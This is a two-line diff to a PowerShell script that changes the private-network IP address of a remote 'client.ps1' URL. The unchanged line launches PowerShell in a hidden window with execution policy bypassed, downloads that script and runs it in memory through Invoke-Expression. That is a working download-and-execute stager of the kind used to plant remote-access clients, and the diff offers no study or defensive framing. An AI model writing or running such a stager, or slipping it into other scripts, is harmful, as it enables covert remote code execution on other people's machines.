@@ -1,2 +1,2 @@
-$s = "http://192.168.1.246:8080/client.ps1"
+$s = "http://192.168.56.1:8080/client.ps1"
 Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"& {Invoke-WebRequest -Uri '$s' -UseBasicParsing | Invoke-Expression}`""
